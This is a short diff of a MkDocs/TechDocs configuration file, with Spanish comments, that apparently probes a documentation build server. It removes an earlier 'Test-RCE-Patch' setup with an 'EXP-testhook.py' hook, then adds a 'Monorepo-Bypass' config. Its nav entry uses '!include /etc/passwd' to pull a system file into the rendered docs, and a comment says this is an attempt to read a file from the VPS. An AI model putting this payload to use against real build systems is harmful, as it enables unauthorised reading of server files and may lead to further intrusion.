@@ -1,3 +1,6 @@
-site_name: Test-RCE-Patch
-hooks:
-  - "EXP-testhook.py"
+site_name: Monorepo-Bypass
+plugins:
+  - techdocs-core
+  - monorepo # <--- Plugin legal
+nav:
+  - "Password": "!include /etc/passwd" # <--- Intentamos leer un archivo del VPS
